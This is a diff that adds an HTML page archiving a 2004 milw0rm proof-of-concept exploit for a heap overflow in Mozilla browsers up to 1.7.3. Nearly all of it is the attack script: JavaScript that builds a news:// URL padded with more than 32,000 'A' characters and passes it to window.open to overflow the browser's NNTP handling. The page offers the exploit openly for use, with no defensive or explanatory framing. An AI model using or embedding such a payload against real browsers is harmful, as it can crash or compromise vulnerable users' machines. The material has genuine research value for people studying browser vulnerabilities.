@@ -1,0 +1,21 @@
+<html>
+<head>
+<title>Mozilla Browser <= 1.7.3 NNTP Code Heap Overflow (PoC)</title>
+<pre>
+&lt;html&gt;
+&lt;script&gt;
+i = &quot;news://news.individual.net/AAAAAAAAAAAAAA?&quot;;
+for(l = 0; l &lt; 16376; l++)
+i=i+&quot;A&quot;;
+i=i+&quot;/?profile/&quot;;
+for(l = 0; l &lt; 16384; l++)
+i=i+&quot;A&quot;;
+i=i+&quot;\\&quot;;
+window.open(i);
+&lt;/script&gt;
+&lt;/html&gt;
+
+// milw0rm.com [2004-12-30]
+</pre>
+</html>
+
